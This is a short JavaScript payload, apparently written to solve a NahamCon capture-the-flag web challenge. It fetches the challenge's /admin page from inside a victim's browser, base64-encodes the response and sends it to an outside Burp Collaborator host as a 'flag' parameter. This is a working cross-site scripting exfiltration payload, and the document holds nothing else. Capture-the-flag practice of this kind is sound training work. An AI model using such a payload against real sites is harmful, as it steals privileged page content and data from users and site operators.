var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch("https://f6msil35rwdb2vf7j8kgqs74jvpmdb.burpcollaborator.net?flag="+btoa(xhr.responseText));
    }
}
xhr.open('GET', 'http://challenge.nahamcon.com:30313/admin', true);
xhr.send(null);
